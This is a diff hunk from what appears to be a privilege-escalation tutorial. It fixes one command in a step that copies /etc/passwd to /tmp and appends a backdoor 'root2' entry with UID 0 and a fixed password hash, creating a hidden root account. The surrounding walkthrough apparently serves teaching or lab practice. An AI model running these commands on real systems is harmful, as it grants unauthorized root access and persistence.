@@ -137,7 +137,7 @@ Continue with the attack by create a writeable copy of `/etc/passwd`, append the
 ```bash
 cat /etc/passwd > /tmp/passwd
 echo 'root2:J68/tUveONM2s:0:0:root:/root:/bin/bash' >> /tmp/passwd
-cat /etc/passwd
+cat /tmp/passwd
 ```
 
 ![Figure 12: Creating a Malicious Copy of `/etc/passwd`](/img/privesc-malicious-passwd.png)
